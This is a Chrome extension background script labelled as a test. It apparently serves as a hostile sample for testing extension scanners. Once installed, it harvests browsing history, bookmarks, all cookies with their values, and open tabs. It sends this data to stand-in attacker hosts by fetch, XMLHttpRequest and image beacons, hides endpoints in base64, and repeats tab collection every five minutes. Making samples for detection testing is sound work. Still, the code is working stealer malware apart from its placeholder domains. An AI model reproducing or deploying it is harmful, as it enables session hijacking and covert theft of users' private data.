// TEST EXTENSION: Network Data Exfiltration Patterns
// This extension contains various data exfiltration patterns for testing

console.log('TEST: Network exfiltration extension loaded');

// Suspicious domains for testing
const SUSPICIOUS_ENDPOINTS = [
  'https://suspicious-domain.com/collect',
  'https://data-collector.evil/api/track',
  'https://analytics-tracker.bad/send',
  'https://remote-endpoint.malicious/upload',
  'http://insecure-endpoint.test/data'
];

// Pattern 1: History exfiltration
function exfiltrateHistory() {
  if (chrome.history) {
    chrome.history.search({
      text: '',
      maxResults: 1000,
      startTime: Date.now() - (30 * 24 * 60 * 60 * 1000) // Last 30 days
    }, (results) => {
      console.log('TEST: Collected', results.length, 'history items');
      
      // Simulate sending to suspicious endpoint
      const historyData = results.map(item => ({
        url: item.url,
        title: item.title,
        visitCount: item.visitCount,
        lastVisitTime: item.lastVisitTime
      }));
      
      sendDataToSuspiciousEndpoint('history', historyData);
    });
  }
}

// Pattern 2: Bookmarks exfiltration
function exfiltrateBookmarks() {
  if (chrome.bookmarks) {
    chrome.bookmarks.getTree((bookmarkTreeNodes) => {
      console.log('TEST: Collected bookmark tree');
      
      function extractBookmarks(nodes) {
        const bookmarks = [];
        for (const node of nodes) {
          if (node.url) {
            bookmarks.push({
              title: node.title,
              url: node.url,
              dateAdded: node.dateAdded
            });
          }
          if (node.children) {
            bookmarks.push(...extractBookmarks(node.children));
          }
        }
        return bookmarks;
      }
      
      const allBookmarks = extractBookmarks(bookmarkTreeNodes);
      sendDataToSuspiciousEndpoint('bookmarks', allBookmarks);
    });
  }
}

// Pattern 3: Cookies exfiltration
function exfiltrateCookies() {
  if (chrome.cookies) {
    chrome.cookies.getAll({}, (cookies) => {
      console.log('TEST: Collected', cookies.length, 'cookies');
      
      const cookieData = cookies.map(cookie => ({
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly
      }));
      
      sendDataToSuspiciousEndpoint('cookies', cookieData);
    });
  }
}

// Pattern 4: Tab information exfiltration
function exfiltrateTabs() {
  if (chrome.tabs) {
    chrome.tabs.query({}, (tabs) => {
      console.log('TEST: Collected', tabs.length, 'open tabs');
      
      const tabData = tabs.map(tab => ({
        title: tab.title,
        url: tab.url,
        active: tab.active,
        windowId: tab.windowId,
        index: tab.index
      }));
      
      sendDataToSuspiciousEndpoint('tabs', tabData);
    });
  }
}

// Pattern 5: Send data to suspicious endpoints
function sendDataToSuspiciousEndpoint(dataType, data) {
  const endpoint = SUSPICIOUS_ENDPOINTS[Math.floor(Math.random() * SUSPICIOUS_ENDPOINTS.length)];
  
  console.log(`TEST: Sending ${dataType} data to ${endpoint}`);
  
  // Simulate various methods of data transmission
  const payload = {
    timestamp: Date.now(),
    userAgent: navigator.userAgent,
    type: dataType,
    data: data,
    extensionId: chrome.runtime.id
  };
  
  // Method 1: fetch() API
  fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Data-Source': 'browser-extension'
    },
    body: JSON.stringify(payload)
  }).catch(err => {
    console.log('TEST: Fetch failed (expected):', err.message);
  });
  
  // Method 2: XMLHttpRequest
  const xhr = new XMLHttpRequest();
  xhr.open('POST', endpoint + '/xhr');
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify(payload));
  xhr.onerror = () => {
    console.log('TEST: XHR failed (expected)');
  };
  
  // Method 3: Image beacon (common stealth technique)
  const img = new Image();
  const encodedData = encodeURIComponent(JSON.stringify(payload));
  img.src = `${endpoint}/beacon?data=${encodedData}`;
  img.onerror = () => {
    console.log('TEST: Image beacon failed (expected)');
  };
}

// Pattern 6: Regular data collection and transmission
function startDataCollection() {
  console.log('TEST: Starting regular data collection');
  
  // Collect data every 5 minutes
  setInterval(() => {
    exfiltrateTabs();
    
    // Collect current page info from active tab
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (tabs[0]) {
        const currentPageData = {
          url: tabs[0].url,
          title: tabs[0].title,
          timestamp: Date.now()
        };
        sendDataToSuspiciousEndpoint('current_page', currentPageData);
      }
    });
  }, 5 * 60 * 1000);
}

// Pattern 7: Base64 encoded endpoint URLs (obfuscation technique)
function useEncodedEndpoints() {
  // Base64 encoded suspicious URLs
  const encodedEndpoints = [
    'aHR0cHM6Ly9zdXNwaWNpb3VzLWRvbWFpbi5jb20vYXBp', // https://suspicious-domain.com/api
    'aHR0cHM6Ly9kYXRhLWNvbGxlY3Rvci5ldmlsL3VwbG9hZA==', // https://data-collector.evil/upload
  ];
  
  encodedEndpoints.forEach(encoded => {
    try {
      const decoded = atob(encoded);
      console.log('TEST: Decoded endpoint:', decoded);
      
      // Simulate sending to decoded endpoint
      fetch(decoded, {
        method: 'POST',
        body: JSON.stringify({ test: 'encoded endpoint' })
      }).catch(err => {
        console.log('TEST: Encoded endpoint request failed (expected)');
      });
    } catch (e) {
      console.log('TEST: Failed to decode endpoint');
    }
  });
}

// Initialize when extension loads
chrome.runtime.onInstalled.addListener(() => {
  console.log('TEST: Network exfiltration extension installed');
  
  // Start data collection after a delay
  setTimeout(() => {
    exfiltrateHistory();
    exfiltrateBookmarks();
    exfiltrateCookies();
    exfiltrateTabs();
    useEncodedEndpoints();
    startDataCollection();
  }, 2000);
});